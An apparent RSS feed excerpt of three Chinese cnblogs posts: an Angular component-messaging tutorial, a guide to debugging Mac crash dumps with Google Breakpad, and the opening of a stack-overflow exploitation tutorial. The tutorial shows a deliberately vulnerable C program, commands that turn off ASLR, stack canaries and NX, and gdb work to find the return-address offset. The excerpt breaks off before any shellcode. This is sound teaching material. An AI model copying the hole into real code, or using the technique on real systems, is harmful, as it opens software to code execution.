  lastPrice: EventEmitter&amp;lt;PriceQuote&amp;gt; = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; EventEmitter();
  &lt;/span&gt;&lt;span&gt;//
&lt;/span&gt;&lt;span&gt;
  constructor() {
    setInterval(() &lt;/span&gt;=&amp;gt;&lt;span&gt; {
      let priceQuote: PriceQuote &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; PriceQuote(&lt;span&gt;this&lt;/span&gt;.stockCode, 100 *&lt;span&gt; Math.random());
      &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.price =&lt;span&gt; priceQuote.lastPrice;
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;用lastPrice emit一个值出去&lt;/span&gt;
      &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.lastPrice.emit(priceQuote);
    }, &lt;/span&gt;1000&lt;span&gt;)
  }

  ngOnInit() {
  }

}&lt;br/&gt;&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;封装一个报价对象来封装股票价格信息&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;将特定的数据结构用类或接口来明确定义是一个良好的习惯&lt;/span&gt;
export &lt;span&gt;class&lt;/span&gt;&lt;span&gt; PriceQuote {
  constructor(&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; stockCode: string, &lt;span&gt;//&lt;/span&gt;&lt;span&gt;股票代码&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; lastPrice: &lt;span&gt;number&lt;/span&gt; &lt;span&gt;//&lt;/span&gt;&lt;span&gt;最新价格&lt;/span&gt;
&lt;span&gt;  ) {
  }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;3、在父组件中接收报价信息并显示&lt;/h2&gt;
&lt;p&gt;父组件模版中通过事件绑定的方式来捕获并处理。 &lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
export &lt;span&gt;class&lt;/span&gt;&lt;span&gt; AppComponent {
  stock &lt;/span&gt;= &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;span&gt;;
  priceQuote: PriceQuote &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; PriceQuote(&lt;span&gt;&quot;&quot;&lt;/span&gt;, 0&lt;span&gt;);

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;event的类型就是子组件emit的时候发射出来的数据的类型&lt;/span&gt;
  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;父组件中通过event就可以拿到&lt;/span&gt;
&lt;span&gt;  priceQuoteHandler(event:PriceQuote){
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.priceQuote=&lt;span&gt;event;
  }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;模版&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&amp;lt;!--默认情况下，事件名字就是output输出属性的名字--&amp;gt;
&amp;lt;app-price-quote (lastPrice)=&lt;span&gt;&quot;priceQuoteHandler($event)&quot;&lt;/span&gt;&amp;gt;&amp;lt;&lt;span&gt;/&lt;/span&gt;app-price-quote&amp;gt;

&amp;lt;div&amp;gt;&lt;span&gt;
  这是在报价组件外部&lt;/span&gt;&amp;lt;br&lt;span&gt;/&lt;/span&gt;&amp;gt;
&lt;span&gt;  股票代码是{{priceQuote.stockCode}},
  股票价格是{{priceQuote.lastPrice &lt;/span&gt;| &lt;span&gt;number&lt;/span&gt;:&lt;span&gt;&quot;2.0-2&quot;&lt;/span&gt;&lt;span&gt;}}
&lt;/span&gt;&amp;lt;&lt;span&gt;/&lt;/span&gt;div&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/315302/201803/315302-20180324111534937-1053230980.png&quot; alt=&quot;&quot; width=&quot;249&quot; height=&quot;93&quot;/&gt;&lt;/p&gt;
&lt;p&gt;默认情况下，事件名字就是output输出属性的名字，可以改变事件名字，通过&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
  @Output(&lt;span&gt;&quot;priceChange&quot;&lt;/span&gt;) &lt;span&gt;//&lt;/span&gt;&lt;span&gt;发射事件需要写上Output&lt;/span&gt;
  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;EventEmitter需要一个范型&lt;/span&gt;
  lastPrice: EventEmitter&amp;lt;PriceQuote&amp;gt; = &lt;span&gt;new&lt;/span&gt; EventEmitter();
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;模版中也改为&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&amp;lt;app-price-quote (&lt;span&gt;priceChange&lt;/span&gt;)=&lt;span&gt;&quot;priceQuoteHandler($event)&quot;&amp;gt;&amp;lt;/app-price-quote&lt;/span&gt;&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;总结：通过输出属性发射事件，并通过事件携带数据，在父组件模版中通过事件绑定的方式来捕获并处理。 &lt;/p&gt;

&lt;p&gt;如果两个组件之间不存父子关系，如何以一种松耦合的方式来传递数据。此时需要使用中间人模式。&lt;/p&gt;

&lt;p&gt;本文作者&lt;a href=&quot;http://www.cnblogs.com/starof/&quot; target=&quot;_blank&quot;&gt;starof&lt;/a&gt;,因知识本身在变化，作者也在不断学习成长，文章内容也不定时更新，为避免误导读者，方便追根溯源，请诸位转载注明出处：&lt;a id=&quot;Editor_Edit_hlEntryLink&quot; title=&quot;view: Angular组件——父子组件通讯&quot; href=&quot;http://www.cnblogs.com/starof/p/8636579.html&quot; target=&quot;_blank&quot;&gt;http://www.cnblogs.com/starof/p/8636579.html&lt;/a&gt; 有问题欢迎与我讨论，共同进步。&lt;/p&gt;
</description>
<pubDate>Sat, 24 Mar 2018 03:24:00 +0000</pubDate>
<dc:creator>starof</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/starof/p/8636579.html</dc:identifier>
</item>
<item>
<title>mac下利用Breakpad的dump文件进行调试 - 24K纯开源</title>
<link>http://www.cnblogs.com/csuftzzk/p/mac_breakpad_qt_dump_debug.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/csuftzzk/p/mac_breakpad_qt_dump_debug.html</guid>
<description>&lt;p&gt;最近把公司的一个视频处理程序更新了一个版本，准备提交测试的发现了崩溃的情况。这个程序采用Qt和ffmpeg技术栈开发，主要用于对视频进行渲染拼接处理，在Windows和mac两个平台同时进行发布。在windows上测试完一切正常，然而就在我以为一切大功告成的时候，测试的同事直接给我来了个当头棒喝，程序崩溃了！没有道理啊，同一套代码在Windows上安然无恙，在Mac上为何直接崩溃？好消息是程序在崩溃的时候保存了dump文件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/214648/201803/214648-20180324101657562-1194806167.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这得感谢前段时间集成的&lt;a href=&quot;https://chromium.googlesource.com/breakpad/breakpad/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;Google Breakpad&lt;/strong&gt;&lt;/a&gt;了。Google Breakpad是Google开发的一个跨平台异常捕获和dump文件（准确的说是mini dump）生成的开发库。利用这个库可以在&lt;strong&gt;Windows&lt;/strong&gt;, &lt;strong&gt;Mac&lt;/strong&gt;, &lt;strong&gt;Linux&lt;/strong&gt;, &lt;strong&gt;iOS&lt;/strong&gt;, &lt;strong&gt;Android&lt;/strong&gt;平台上对程序异常崩溃进行捕获，并生成dump文件供后期调试。据说Google Chrome, Chromium, Firefox都使用了这套机制，因此其可用性是经得起考验的，并且这个库现在依然更新的很频繁。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/214648/201803/214648-20180324101514600-262019200.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 如此强大的东西，怎么使用呢？好在网上关于breakpad的资料是还是挺多的，只不过都不是很完整很简洁。要么就只介绍了实现原理、或者只介绍了怎么编译、或者就只介绍了怎么集成，对于新手使用非常不友善。这里就根据我在Windows和Mac两个平台的使用经验来总结下吧。&lt;/p&gt;

&lt;p&gt; breakpad以源代码的形式发布，所以首先要从仓库中把代码下下来：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
git clone https://chromium.googlesource.com/breakpad/breakpad　　
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这个是Google的代码仓库，基于国内的环境需要把VPN打开。下载下来的代码包含了windows, mac, linux三个平台所有的文件了，也包含了各个平台的工具源码。没错，breakpad的工具需要自己编译。&lt;/p&gt;
&lt;p&gt;假设源代码下载到了E:/breakpad，那么进入到这个目录运行make命令：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
./configure
make
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在Windows上需要用&lt;strong&gt;gyp&lt;/strong&gt;工具来编译，所以还得下载gyp非常麻烦。在mac上就非常简单了，直接运行上述命令即可生成静态库文件。但是工具的话需要进入到tools目录，里面有个已经配置好的xcode工程，直接打开即可编译。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/214648/201803/214648-20180324110157520-906599734.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;不过要注意的是，最新的breakpad源码在编译工具的时候会报错：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;38&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
Undefined symbols for architecture x86_64:
  &quot;google_breakpad::BaseName(std::__1::basic_string&amp;lt;char, std::__1::char_traits&amp;lt;char&amp;gt;, std::__1::allocator&amp;lt;char&amp;gt; &amp;gt; const&amp;amp;)&quot;, referenced from:
      google_breakpad::DumpSymbols::CreateEmptyModule(google_breakpad::scoped_ptr&amp;lt;google_breakpad::Module&amp;gt;&amp;amp;) in dump_syms.o
ld: symbol(s) not found for architecture x86_64
clang: error: linker command failed with exit code 1 (use -v to see invocation)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;a href=&quot;https://groups.google.com/forum/#!topic/google-breakpad-discuss/fierVnIAv1M&quot; target=&quot;_blank&quot;&gt;解决办法&lt;/a&gt;是：&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/214648/201803/214648-20180324104249652-2080257151.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 在这一步中我们编译源码主要是为了得到两个工具：&lt;strong&gt;minidump_stackwalk&lt;/strong&gt;和&lt;strong&gt;dump_syms&lt;/strong&gt;。这两个分别有什么用呢？&lt;strong&gt;dump_syms&lt;/strong&gt;用于从可执行程序中抽取出调试符号保存到&lt;strong&gt;syms&lt;/strong&gt;符号文件中，而&lt;strong&gt;minidump_stackwalk&lt;/strong&gt;则根据syms文件来分析&lt;strong&gt;mini dump&lt;/strong&gt;文件，得到一个可读性强的崩溃调用堆栈。由于我的工程是基于Qt的，所以我直接利用了&lt;a href=&quot;https://github.com/gyunaev/google-breakpad-qt&quot; target=&quot;_blank&quot;&gt;Github&lt;/a&gt;上面的一个开源项目进行编译。这个项目针对Qt剔除了一些无用的头文件，并对源代码做了稍微的调整。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/214648/201803/214648-20180324104932845-1802402797.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;基于QMake的工程，可以直接用Qt Creator打开编译。在Windows上和Mac上无缝支持。编译即可得到我们需要的lib文件了。这个在我们后面集成工程中链接需要用到。当然也可以直接将源代码集成到工程去。&lt;/p&gt;
&lt;p&gt;接下来就讲讲如何集成吧。集成步骤其实非常简单，直接上代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;52&quot;&gt;
&lt;pre class=&quot;brush:cpp;gutter:true;&quot;&gt;
#ifdef _WINDOWS
#include &amp;lt;client/windows/handler/exception_handler.h&amp;gt;
#else
#include &amp;lt;client/mac/handler/exception_handler.h&amp;gt;
#endif

#ifdef _WINDOWS
bool minidumpCB(const wchar_t *dump_path, const wchar_t *id, void *context, EXCEPTION_POINTERS *exinfo, MDRawAssertionInfo *assertion, bool succeeded) {
#else
bool minidumpCB(const char* dump_path, const char* id, void* context, bool succeeded) {
#endif
    if (succeeded) {
        std::wcout &amp;lt;&amp;lt; &quot;Mini Dump file: &quot; &amp;lt;&amp;lt; id &amp;lt;&amp;lt; &quot;.dump Path: &quot; &amp;lt;&amp;lt; dump_path &amp;lt;&amp;lt; std::endl;
    }  
    return succeeded;
}

int main() {&lt;br/&gt;#ifdef NDEBUG  // 只在Release模式下启用Breakpad
#ifdef _WINDOWS
    google_breakpad::ExceptionHandler eh(dumpLocation.toStdWString(), NULL, minidumpCB, NULL, google_breakpad::ExceptionHandler::HANDLER_ALL);
#else
    google_breakpad::ExceptionHandler eh(dumpLocation.toStdString(), NULL, minidumpCB, NULL, true, NULL);
#endif&lt;br/&gt;#endif
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;接口非常简单，只要定义一个回调函数minidumpCB()。当程序崩溃被捕捉到的时候就会调用这个函数，这里只是输出了mini dump文件保存的位置。如果第一张截图中的红框所示。&lt;/p&gt;

&lt;p&gt; 生成的dump文件如何利用？如何转换成我们能看得懂的调用堆栈信息？其实有上面编译出来的两个工具，接下来的工作分三个步骤：&lt;/p&gt;
&lt;ul&gt;&lt;li readability=&quot;-2&quot;&gt;使用&lt;strong&gt;dump_syms&lt;/strong&gt;生成符号表：
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
./dump_syms ~/Test/Caputre &amp;gt; Capture.syms
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;创建有层次的调试符号文件夹：
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
head -n1 Capture.syms  // 查看文件层次
mkdir -p ./symbols/PanoramaCapture/3EXXXXXX/ //这一步根据上面的输出来
mv Capture.syms ./symbols/PanoramaCapture/3EXXXXX/ // 将符号文件移动进去
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li readability=&quot;-2&quot;&gt;利用&lt;strong&gt;minidump_stackwalk&lt;/strong&gt;分析dump文件：
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
./minidump_stackwalk minidump.dmp ./symbols
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/214648/201803/214648-20180324110722065-1564322356.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;   最后一步将输出详细的堆栈信息：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/214648/201803/214648-20180324111457616-1227426855.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;  相信有了这些信息，找出代码中潜伏的bug不是什么难事了。而我也正是根据这些信息，成功解决了这次的崩溃问题。再提一句，不管在Windows上还是Mac上，编译Release的时候最好把调试符号文件保存好。这样利用breakpad来分析的时候才能事半功倍，breakpad方才能展现其强大的一面。&lt;/p&gt;

&lt;p&gt;1.&lt;a href=&quot;https://www.jianshu.com/p/295ebf42b05b&quot; target=&quot;_blank&quot;&gt; https://www.jianshu.com/p/295ebf42b05b&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2. &lt;a href=&quot;https://github.com/google/breakpad&quot; target=&quot;_blank&quot;&gt;https://github.com/google/breakpad&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;3. &lt;a href=&quot;https://groups.google.com/forum/#!topic/google-breakpad-discuss/fierVnIAv1M&quot; target=&quot;_blank&quot;&gt;https://groups.google.com/forum/#!topic/google-breakpad-discuss/fierVnIAv1M&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;4. &lt;a href=&quot;https://github.com/gyunaev/google-breakpad-qt&quot; target=&quot;_blank&quot;&gt;https://github.com/gyunaev/google-breakpad-qt&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Sat, 24 Mar 2018 03:18:00 +0000</pubDate>
<dc:creator>24K纯开源</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/csuftzzk/p/mac_breakpad_qt_dump_debug.html</dc:identifier>
</item>
<item>
<title>栈溢出漏洞的利用和缓解 - 有价值炮灰</title>
<link>http://www.cnblogs.com/pannengzhi/p/exploit-the-stack.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/pannengzhi/p/exploit-the-stack.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;http://otktjfpva.bkt.clouddn.com/excerpt/stackoverflow.png&quot; alt=&quot;excerpt&quot;/&gt;&lt;br/&gt;一直有人说这个时代做渗透太难了, 各个平台都开始重视安全性, 不像十几年前,&lt;br/&gt;随便有个栈溢出就能轻松利用. 现在的环境对于新手而言确实不算友好, 上来就需要&lt;br/&gt;面临着各种边界保护, 堆栈保护, 地址布局随机化. 但现实如此, 与其抱怨,&lt;br/&gt;不如直面现实, 拥抱变化, 对吧?&lt;/p&gt;
&lt;blockquote readability=&quot;4.904347826087&quot;&gt;
&lt;p&gt;本文所演示的环境为64位Linux+32位ELF程序.&lt;br/&gt;文中所用到的代码和exp皆可在&lt;a href=&quot;https://github.com/pannzh/stack-overflow-demo&quot;&gt;github仓库中找到&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;


&lt;p&gt;首先, 当然是要先了解什么是栈溢出. 要了解栈溢出, 就必须要先知道栈的布局.&lt;br/&gt;以32位应用程序为例, 假设函数foo有两个参数和两个局部变量:&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;sourceCode c&quot;&gt;
&lt;code class=&quot;sourceCode c&quot;&gt;&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; foo(&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; arg1, &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; arg2) {
    &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; local1;
    &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; local2;
    &lt;span class=&quot;co&quot;&gt;// ...&lt;/span&gt;
}&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;那么该函数的栈帧布局如下:&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;函数调用者的变量&lt;/td&gt;
&lt;td&gt;[ebp + 16]&lt;/td&gt;
&lt;td&gt;[esp + 24]&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;arg2&lt;/td&gt;
&lt;td&gt;[ebp + 12]&lt;/td&gt;
&lt;td&gt;[esp + 20]&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;arg1&lt;/td&gt;
&lt;td&gt;[ebp + 8]&lt;/td&gt;
&lt;td&gt;[esp + 16]&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;返回地址&lt;/td&gt;
&lt;td&gt;[ebp + 4]&lt;/td&gt;
&lt;td&gt;[esp + 12]&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;保存的ebp&lt;/td&gt;
&lt;td&gt;[ebp]&lt;/td&gt;
&lt;td&gt;[esp + 8]&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;local1&lt;/td&gt;
&lt;td&gt;[ebp - 4]&lt;/td&gt;
&lt;td&gt;[esp + 4]&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;local2&lt;/td&gt;
&lt;td&gt;[ebp - 8]&lt;/td&gt;
&lt;td&gt;[esp]&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;要记住栈是往低地址增长的. 所以每当有新的本地变量(入栈), 其地址也就越小.&lt;br/&gt;关于x86的汇编这里不想介绍太多, 如果只想有个快速认识, 可以参考&lt;a href=&quot;https://www.cs.uaf.edu/2008/fall/cs301/support/x86/&quot;&gt;x86 Assembly Cheat Sheet&lt;/a&gt;,&lt;br/&gt;如果想要对汇编, 调用约定和平台差异有深入了解的话, 建议阅读&lt;a href=&quot;https://beginners.re/&quot;&gt;RE4B&lt;/a&gt;(&lt;a href=&quot;https://wizardforcel.gitbooks.io/re-for-beginners/content/&quot;&gt;中文版&lt;/a&gt;).&lt;/p&gt;
&lt;h2 id=&quot;程序准备&quot;&gt;程序准备&lt;/h2&gt;
&lt;p&gt;本文中, 我们用一个简单的c程序来介绍漏洞的利用和缓解:&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;11&quot;&gt;
&lt;pre class=&quot;sourceCode c&quot;&gt;
&lt;code class=&quot;sourceCode c&quot;&gt;&lt;span class=&quot;co&quot;&gt;// victim.c&lt;/span&gt;
&lt;span class=&quot;ot&quot;&gt;# include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; foo() {
    &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; buf[&lt;span class=&quot;dv&quot;&gt;10&lt;/span&gt;];
    scanf(&lt;span class=&quot;st&quot;&gt;&quot;%s&quot;&lt;/span&gt;, buf);
    printf(&lt;span class=&quot;st&quot;&gt;&quot;hello %s&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt;, buf);
    &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;;
}
&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; main() {
    foo();
    printf(&lt;span class=&quot;st&quot;&gt;&quot;good bye!&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt;);
    &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;;
}
&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; dummy() {
    __asm__(&lt;span class=&quot;st&quot;&gt;&quot;nop; jmp esp&quot;&lt;/span&gt;);
}&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;可以看到, 当输入过长时, buf变量会溢出其边界, 导致往栈底(高地址)覆盖,&lt;br/&gt;从而会有修改到本不该被修改的内容, 下节就以该程序为起点进行分析.&lt;br/&gt;dummy函数下面会说其作用.&lt;/p&gt;

&lt;p&gt;上古时期, 混沌初开, 人们对安全的概念还没有太大认知, 各种bug频出,&lt;br/&gt;编译器也仅仅是实现了基本功能, 还整天被程序员催更(实现各种C/C++新标准和特性).&lt;br/&gt;所以并未对缓冲溢出漏洞的利用作各种限制, 模拟这种场景可以用如下方式:&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;sourceCode sh&quot;&gt;
&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span class=&quot;co&quot;&gt;# 运行时禁用ASLR(系统级):&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;echo&lt;/span&gt; 0 &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;sudo&lt;/span&gt; tee /proc/sys/kernel/randomize_va_space
&lt;span class=&quot;co&quot;&gt;# 或者:&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt;# sudo sysctl kernel.randomize_va_space=0&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt;# 或者新建一个禁用ASLR的bash环境(用户级):&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt;# setarch `uname -m` -R /bin/bash&lt;/span&gt;

&lt;span class=&quot;co&quot;&gt;# 编译时禁用canary和NX:&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;gcc&lt;/span&gt; victim.c -o victim -g -m32 -no-pie -masm=intel -fno-stack-protector -z execstack&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;-m32&lt;/code&gt;是因为我的系统为64位, 这里编译出32位的应用程序. &lt;code&gt;-no-pie&lt;/code&gt;是为了不启用PIC.&lt;br/&gt;这时有人看到这种程序会想, buf溢出之后, 如果控制得当, 不是可以覆盖返回地址吗,&lt;br/&gt;也就是说可以覆盖PC指针, 执行代码. 那么怎么样才能执行想要的代码呢, 比如&lt;code&gt;system(&quot;/bin/sh&quot;)&lt;/code&gt;?&lt;br/&gt;最简单的办法就是把想执行的代码用机器码表示, 即俗称的shellcode, 将其写入程序,&lt;br/&gt;然后将返回地址修改为该段shellcode的起始地址, 不就OK了吗? 所以我们scanf的输入应该类似于:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;# 低地址 ---&amp;gt; 高地址
...[shellcode]...[返回地址]...
# 或者
...[返回地址]...[shellcode]...&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;前者是把shellcode写在foo函数的栈帧里, 但其大小有限; 后者则是把shellcode写在调用者(main)的栈帧里.&lt;br/&gt;关键是地址如何确定? shellcode如何编写?&lt;/p&gt;
&lt;h2 id=&quot;确定地址&quot;&gt;确定地址&lt;/h2&gt;
&lt;p&gt;返回地址看似是buf+10, 但考虑到编译器的不同会导致预留(对齐)不同的空间, 所以需要精确确认.&lt;br/&gt;先生成(或者自己写)一个有固定模式的字符串, 这里用&lt;code&gt;De Brujin&lt;/code&gt;序列:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ ragg2 -P 40 -r
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAAN&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后用gdb启动victim程序调试并输入上述paylod:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ gdb victim
(gdb) run
Starting program: /home/pan/victim 
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAAN
hello AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAAN

Program received signal SIGSEGV, Segmentation fault.
0x41494141 in ?? ()
(gdb) p $eip
$1 = (void (*)()) 0x41494141&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;看到程序发生段错误, 并且PC指针eip的值为0x41494141, 即小端的AAIA,&lt;br/&gt;出现在De Brujin序列的第23字节, 所以可以确定输入溢出到第23字节时覆盖了PC指针.&lt;br/&gt;确定了位置, 那么该写哪个地址值呢? 我们知道应该要跳转到shellcode头部,&lt;br/&gt;shellcode写在buf中, 而buf则在栈上(还记得上面的栈帧表格吗?), 反汇编foo函数:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;(gdb) disassemble foo
Dump of assembler code for function foo:
   0x0804848b &amp;lt;+0&amp;gt;: push   ebp
   0x0804848c &amp;lt;+1&amp;gt;: mov    ebp,esp
   0x0804848e &amp;lt;+3&amp;gt;: push   ebx
   0x0804848f &amp;lt;+4&amp;gt;: sub    esp,0x14
   0x08048492 &amp;lt;+7&amp;gt;: call   0x80483c0 &amp;lt;__x86.get_pc_thunk.bx&amp;gt;
   0x08048497 &amp;lt;+12&amp;gt;:    add    ebx,0x1b69
   0x0804849d &amp;lt;+18&amp;gt;:    sub    esp,0x8
   0x080484a0 &amp;lt;+21&amp;gt;:    lea    eax,[ebp-0x12]
   0x080484a3 &amp;lt;+24&amp;gt;:    push   eax
   0x080484a4 &amp;lt;+25&amp;gt;:    lea    eax,[ebx-0x1a50]
   0x080484aa &amp;lt;+31&amp;gt;:    push   eax
   0x080484ab &amp;lt;+32&amp;gt;:    call   0x8048370 &amp;lt;__isoc99_scanf@plt&amp;gt;
   0x080484b0 &amp;lt;+37&amp;gt;:    add    esp,0x10
   0x080484b3 &amp;lt;+40&amp;gt;:    sub    esp,0x8
   0x080484b6 &amp;lt;+43&amp;gt;:    lea    eax,[ebp-0x12]
   0x080484b9 &amp;lt;+46&amp;gt;:    push   eax
   0x080484ba &amp;lt;+47&amp;gt;:    lea    eax,[ebx-0x1a4d]
   0x080484c0 &amp;lt;+53&amp;gt;:    push   eax
   0x080484c1 &amp;lt;+54&amp;gt;:    call   0x8048340 &amp;lt;printf@plt&amp;gt;
   0x080484c6 &amp;lt;+59&amp;gt;:    add    esp,0x10
   0x080484c9 &amp;lt;+62&amp;gt;:    mov    eax,0x0
   0x080484ce &amp;lt;+67&amp;gt;:    mov    ebx,DWORD PTR [ebp-0x4]
   0x080484d1 &amp;lt;+70&amp;gt;:    leave  
   0x080484d2 &amp;lt;+71&amp;gt;:    ret    
End of assembler dump.&lt;/code&gt;
